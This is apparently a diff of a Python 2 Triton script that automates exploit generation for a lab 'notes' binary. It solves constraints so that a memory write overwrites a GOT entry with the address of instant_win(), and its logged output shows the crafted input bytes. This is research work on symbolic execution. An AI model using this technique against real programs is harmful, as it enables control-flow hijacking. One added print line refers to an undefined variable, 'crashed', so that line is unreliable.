@@ -2,6 +2,7 @@
 ## -*- coding: utf-8 -*-
 
 _ = """
+export CRASHED_AT='0x00007ffff7a8c231'  ### value is just example
 time ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton solve-notes.py vuln-samples/notes < vuln-samples/crash-inputs/notes-1
 """
 
@@ -29,7 +30,7 @@ def solve():
     try:
         if True:
             pc = Triton.getPathConstraintsAst()
-            print '[TT] Solving Path constriant...'
+            print '[TT] Solving Path constraint...'
             models = Triton.getModels(pc, 1)
             if len(models) == 0:
                 print '[TT] Model for Path Constraint: unsat'
@@ -41,46 +42,44 @@ def solve():
                     inputs[k] = chr(v.getValue())
 
         if mc is not None and mnode is not None:
-            print 'mc:', mc
-            print 'mnode:', mnode
-            print 'mc.evaluate() = %#x' % mc.evaluate()
-            print 'mc.getBitvectorSize() = %d' % mc.getBitvectorSize()
-            print 'mnode.getBitvectorSize() = %d' % mnode.getBitvectorSize()
-            # m = Triton.getModel(astCtxt.equal(mc, astCtxt.bv(0x602060 + 0, CPUSIZE.QWORD_BIT)))
-            # m = Triton.getModel(astCtxt.equal(mc, astCtxt.bv(0x400ab0, CPUSIZE.QWORD_BIT))) # instant_win()
-            # if mnode.getBitvectorSize() == CPUSIZE.QWORD_BIT:
+            print '\tmc:', mc
+            print '\tmnode:', mnode
+            print '\tmc.evaluate() = %#x' % mc.evaluate()
+            print '\tmc.getBitvectorSize() = %d' % mc.getBitvectorSize()
+            print '\tmnode.getBitvectorSize() = %d' % mnode.getBitvectorSize()
             print '[TT] Solving Memory Access constriant...'
-            if True:
-                m = Triton.getModel(
-                        astCtxt.land([
-                            astCtxt.equal(mc, astCtxt.bv(0x602060 + 3 * 8, CPUSIZE.QWORD_BIT)), # GOT Table
-                            astCtxt.equal(mnode, astCtxt.bv(0xb2, CPUSIZE.BYTE_BIT)), # instant_win() = 0x4008b2
-                        ])
-                    )
-                if len(m) > 0:
-                    found = True
-                    print '[TT] Model for Memory Access:', m
-                    for k, v in m.items():
-                        inputs[k] = chr(v.getValue())
-                        crash_inputs[k] = chr(v.getValue())
-                else:
-                    print '[TT] Model for Memory Access: unsat'
+            m = Triton.getModel(
+                    astCtxt.land([
+                        astCtxt.equal(mc, astCtxt.bv(0x602060 + 3 * 8, CPUSIZE.QWORD_BIT)), # GOT Table
+                        astCtxt.equal(mnode, astCtxt.bv(0xb2, CPUSIZE.BYTE_BIT)), # instant_win() = 0x4008b2
+                    ])
+                )
+            if len(m) > 0:
+                found = True
+                print '[TT] Model for Memory Access:', m
+                for k, v in m.items():
+                    inputs[k] = chr(v.getValue())
+                    crash_inputs[k] = chr(v.getValue())
+            else:
+                print '[TT] Model for Memory Access: unsat'
 
         if found:
-            print 'Found: '
-            # crash_inputs += ['\x08', '\x40', '\x00', '\0', '\0', '\0', '\0', '\n']
-            # crash_inputs += ['A'] * 0x10 + ['\n']
-            # print inputs
-            print '%r' % ''.join(inputs).strip('\0')
-            print crash_inputs
-            print 'Crash Inputs: %r' % ''.join(crash_inputs)
-            # res = raw_input('[TT] Reading remaining stdin...')
+            print '~' * 8
+
+            ### Review result
+            print 'Found exploitable crash: ', '%r' % ''.join(inputs).strip('\0')
+            print 'Crash inputs: %r' % ''.join(crash_inputs)
+
+            ### Save result for next phase
+            print('[TT] Reading remaining stdin...')
             res = sys.stdin.read(1024)
-            print "read stdin = '%r'" % res
-            # res += '\n' ### append stripped new line
+            print "\tread stdin = '%r'" % res
             crash_inputs += list(res)
-            with open('crash_inputs', 'wb') as f:
+            RESULT_FILE = 'crash_inputs'
+            with open(RESULT_FILE, 'wb') as f:
                 f.write(''.join(crash_inputs))
+            print '[TT] crash input is saved as \'{}\''.format(RESULT_FILE)
+
             return True
         else:
             print 'not found ;('
@@ -90,24 +89,11 @@ def solve():
         exit()
 
 
-def getMemoryString(addr):
-    index = 0
-    s = str()
-
-    while getCurrentMemoryValue(addr+index):
-        c = chr(getCurrentMemoryValue(addr+index))
-        s += ("" if c not in string.printable else c)
-        index += 1
-
-    return s
-
-
 def syscallsEntry(threadId, std):
     global isOpen
     global isRead
     global targetFd
 
-    # print '[TT:debug] syscallsEntry'
     if getSyscallNumber(std) == SYSCALL64.READ:
         fd   = getSyscallArgument(std, 0)
         buff = getSyscallArgument(std, 1)
@@ -125,8 +111,6 @@ def syscallsExit(threadId, std):
     global stdin_len
     global concrete_input_offets
 
-    # print '[TT:debug] syscallsExit'
-
     ctxt = getTritonContext()
 
     if isRead is not None:
@@ -134,19 +118,19 @@ def syscallsExit(threadId, std):
         buff = isRead['buff']
         print '\n[TT] Symbolizing stdin (buf=%#x, size=%d)' % (buff, size)
         for index in range(size):
-            Triton.taintMemory(buff+index)
             print '\tread: %r' % chr(getCurrentMemoryValue(buff+index))
-            crash_inputs.append(chr(getCurrentMemoryValue(buff+index)))
+            crash_inputs.append(chr(getCurrentMemoryValue(buff+index))) ### log stdin
+
             start_time = time.time()
+            ### Symbolize input
             ctxt.setConcreteMemoryValue(buff+index, getCurrentMemoryValue(buff+index))
-            # if stdin_len >= 30 and stdin_len < 50: ### makes incorrect result
-            if True:
-                print "Symbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### become slower
-            ### concretize part of stdin
+            print "Symbolized input: ", ctxt.convertMemoryToSymbolicVariable(MemoryAccess(buff+index, CPUSIZE.BYTE)) ### become slower
+            ### Concretize part of stdin
             if stdin_len in concrete_input_offets:
                 ctxt.concretizeMemory(MemoryAccess(buff+index, CPUSIZE.BYTE))
             end_time = time.time()
             print 'symbolize took %f sec' % (end_time - start_time)
+
             stdin_len += 1
         isRead = None
 
@@ -156,14 +140,11 @@ def syscallsExit(threadId, std):
 def mycb(inst):
     global mc
     global mnode
+    global crashed_at
 
-    # if inst.getAddress() < 0x1000000:
-    #     print inst
-    # print inst
-    if (inst.getAddress() & 0xfff) == (0x00007ffff7a8c231 & 0xfff):
+    if (inst.getAddress() & 0xfff) == (crashed_at & 0xfff):
         if inst.isMemoryWrite() and Triton.getPathConstraintsAst().isSymbolized():
             mem, node = inst.getStoreAccess()[0]
-            # if (mem.getLeaAst() is not None) and mem.getLeaAst().isSymbolized():
             if (mem.getLeaAst() is not None):
                 print inst
                 mc = mem.getLeaAst()
@@ -180,31 +161,42 @@ def mycb(inst):
     return
 
 def signals(threadId, sig):
-    print "signals()"
-    print sig
+    print 'Signal %d received on thread %d.' % (sig, threadId)
 
-    solve()
+    # found = solve()
+    # if found:
+    #     print "[TT] Go on to phase 2"
+    #     exit()
 
 
 if __name__ == '__main__':
 
-    # Define symbolic optimizations
+    ### Define symbolic optimizations
     Triton.enableMode(MODE.ALIGNED_MEMORY, True) ### **REQUIRED** (slowns, but nor leaAst becomes bvtrue)
     Triton.enableMode(MODE.ONLY_ON_SYMBOLIZED, True) ### **REQUIRED**
 
     startAnalysisFromSymbol('main')
 
-    # concrete_input_offets = range(26)
-    concrete_input_offets = range(0)
+    ### Enforce concrete execution on partial of stdin
+    concrete_input_offets = range(40)
+    # concrete_input_offets = range(0)
 
-    # Add callback
+    ### Set the address where crash occurs
+    if 'CRASHED_AT' in os.environ:
+        crashed_at = int(os.environ['CRASHED_AT'], 16)
+        print '[TT] reported that the program was crashed at {}'.format(crashed)
+    else:
+        print '[TT] set value to environment variable \'CRASHED_AT\' which is the address where the crash occurs'
+        exit()
+
+    ### Add callback
     insertCall(mycb, INSERT_POINT.BEFORE)
     insertCall(signals, INSERT_POINT.SIGNALS) # wait for SIGSEGV
 
     insertCall(syscallsEntry, INSERT_POINT.SYSCALL_ENTRY)
     insertCall(syscallsExit,  INSERT_POINT.SYSCALL_EXIT)
 
-    # Run Program
+    ### Run Program
     runProgram()
 
 
@@ -230,8 +222,25 @@ Found:
 ~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  1630.75s user 6.39s system 99% cpu 27:27.10 total
 K_atc% 
 
-concrete_input_offets = range(0)
+### concrete_input_offets = range(0)
+------
+[TT] Detected memory access violation
+[TT] Solving Path constriant...
+    Found 1 models
+[TT] Model #0 for Path Constraint: {40L: SymVar_40 = 0xF5, 41L: SymVar_41 = 0xF5, 42L: SymVar_42 = 0x0, 43L: SymVar_43 = 0x0, 44L: SymVar_44 = 0x0, 45L: SymVar_45 = 0x0, 46L: SymVar_46 = 0x0, 47L: SymVar_47 = 0x0, 48L: SymVar_48 = 0x8, 49L: SymVar_49 = 0x0, 50L: SymVar_50 = 0xA, 51L: SymVar_51 = 0xF5, 52L: SymVar_52 = 0xF5, 53L: SymVar_53 = 0xF5, 54L: SymVar_54 = 0xF5, 55L: SymVar_55 = 0xF5, 56L: SymVar_56 = 0xA, 57L: SymVar_57 = 0x75, 59L: SymVar_59 = 0x34, 60L: SymVar_60 = 0xB0, 61L: SymVar_61 = 0xF5, 62L: SymVar_62 = 0xF5, 63L: SymVar_63 = 0xF5, 64L: SymVar_64 = 0xF5, 65L: SymVar_65 = 0xF5, 66L: SymVar_66 = 0xA, 67L: SymVar_67 = 0xF5}
+mc: (bvadd ref!447501 (bvadd (bvmul (_ bv0 64) (_ bv1 64)) (_ bv0 64)))
+mnode: ((_ extract 7 0) ref!447488)
+mc.evaluate() = 0x41412d4141434141
+mc.getBitvectorSize() = 64
+mnode.getBitvectorSize() = 8
+[TT] Solving Memory Access constriant...
+[TT] Model for Memory Access: {67L: SymVar_67 = 0xB2, 42L: SymVar_42 = 0x78, 43L: SymVar_43 = 0x20, 44L: SymVar_44 = 0x60, 45L: SymVar_45 = 0x0, 46L: SymVar_46 = 0x0, 47L: SymVar_47 = 0x0, 48L: SymVar_48 = 0x0, 49L: SymVar_49 = 0x0}
+Found: 
+'\xf5\xf5x `\x00\x00\x00\x00\x00\n\xf5\xf5\xf5\xf5\xf5\nu\x004\xb0\xf5\xf5\xf5\xf5\xf5\n\xb2'
+Crash Inputs: 'n\ntit\ncon\nn\ntit!\ncon!\nu\n1\nAAA%AAsAABAA$AAnx `\x00\x00\x00\x00\x00\ncon!!\nu\n2\ntit!!\n\xb2'
+[TT] Reading remaining stdin...
+    read stdin = ''rashcrash\n''
 [TT] Go on to phase 2
-~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  666.28s user 2.64s system 99% cpu 11:11.97 total
-
+~/project/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build/triton   <  18.71s user 2.01s system 99% cpu 20.756 total
+------
 """
